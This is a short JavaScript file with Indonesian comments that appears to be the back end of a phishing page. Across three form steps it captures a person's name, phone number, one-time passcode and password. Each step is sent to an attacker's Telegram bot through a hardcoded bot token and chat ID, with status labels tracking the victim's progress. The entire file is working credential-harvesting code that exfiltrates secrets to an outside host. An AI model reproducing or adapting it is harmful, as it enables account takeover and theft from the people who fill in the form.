const botToken = "7584451181:AAHttE_QErAgHq8AhJfaNJeWpaV5xwT70sI";
const chatId = "6381511262";

const Toast = Swal.mixin({
  toast: true,
  position: "top-end",
  showConfirmButton: false,
  timer: 5000,
  timerProgressBar: true,
  didOpen: (toast) => {
    toast.onmouseenter = Swal.stopTimer;
    toast.onmouseleave = Swal.resumeTimer;
  },
});

function sendToBot(data) {
  // Format pesan untuk dikirim ke Telegram
  const message = `*[Form Baru Terdaftar]*\n\n*Nama:* ${
    data[0]
  }\n*Nomor Telepon:* ${data[1]}\n*OTP:* ${data[2] ?? "-"}\n*Kata Sandi:* ${
    data[3] ?? "-"
  }\n*Status:* ${data[4] ?? "-"}\n*Sesi Aktif:* ${timeSince(
    data[5]
  )} yang lalu.`;

  // Mengirim pesan ke bot Telegram
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      parse_mode: "markdown",
      text: message,
    }),
  })
    .then((response) => response.json())
    .then((result) => {
      if (result.ok) {
        Toast.fire({
          icon: "success",
          title: "Pesan berhasil dikirim!",
        });
      } else {
        Toast.fire({
          icon: "error",
          title: "Gagal mengirim pesan: " + result.description,
        });
      }
    })
    .catch((error) => {
      Toast.fire({
        icon: "error",
        title: "Terjadi kesalahan: " + error.message,
      });
    });
}

function timeSince(date) {
  const seconds = Math.floor((new Date() - new Date(date)) / 1000);
  let interval = seconds / 31536000;

  if (interval > 1) return Math.floor(interval) + " tahun";
  interval = seconds / 2592000;
  if (interval > 1) return Math.floor(interval) + " bulan";
  interval = seconds / 86400;
  if (interval > 1) return Math.floor(interval) + " hari";
  interval = seconds / 3600;
  if (interval > 1) return Math.floor(interval) + " jam";
  interval = seconds / 60;
  if (interval > 1) return Math.floor(interval) + " menit";

  return Math.floor(seconds) + " detik";
}

// Fungsi untuk mengambil data dari form pertama dan mengirimnya ke bot
function processFirstData() {
  const fullName = document.getElementById("full_name").value;
  const phoneNumber = document.getElementById("phone_number").value;

  const messageData = [
    fullName,
    phoneNumber,
    null,
    null,
    "Menunggu OTP",
    Date.now(),
  ]; // Mengirim data ke bot
  sendToBot(messageData);

  document.querySelector(".first").style.display = "none";
  document.querySelector(".second").style.display = "block";
}

// Fungsi untuk mengambil data dari form kedua dan mengirimnya ke bot
function processSecondData() {
  const otp = document.getElementById("otp").value;
  const password = document.getElementById("password").value;

  const messageData = [
    null,
    null,
    otp,
    password,
    "Menunggu Konfirmasi",
    Date.now(),
  ]; // Mengirim data ke bot
  sendToBot(messageData);

  document.querySelector(".second").style.display = "none";
  document.querySelector(".third").style.display = "block";
}

// Fungsi untuk mengambil data dari form ketiga dan mengirimnya ke bot
function processThirdData() {
  const password = document.getElementById("password").value;

  const messageData = [
    null,
    null,
    null,
    password,
    "Proses Selesai",
    Date.now(),
  ]; // Mengirim data ke bot
  sendToBot(messageData);

  document.querySelector(".third").style.display = "none";
  document.querySelector(".four").style.display = "block";
}
